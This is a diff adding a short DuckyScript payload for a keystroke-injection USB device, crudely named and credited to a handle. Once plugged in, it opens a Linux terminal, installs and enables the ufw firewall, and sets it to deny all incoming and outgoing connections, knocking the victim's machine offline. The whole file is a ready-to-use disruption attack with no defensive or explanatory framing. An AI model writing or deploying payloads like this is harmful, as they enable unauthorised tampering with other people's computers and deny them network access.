@@ -1,0 +1,22 @@
+REM Name: Port-Fucker
+REM Author: Sorted#0002
+REM Description: This Script Downloads UFW Then Disables All Incoming And Outgoing Ports\Connections
+REM: ====================================================================================================
+CTRL-ALT t
+DELAY 500
+STRING apt-get install ufw -y
+ENTER
+DELAY 100
+STRING ufw enable
+DELAY 100
+ENTER
+STRING y
+DELAY 100
+ENTER
+STRING ufw default deny incoming
+ENTER
+DELAY 100
+STRING ufw default deny outgoing
+ENTER
+DELAY 100
+STRING PORTS DISABLED
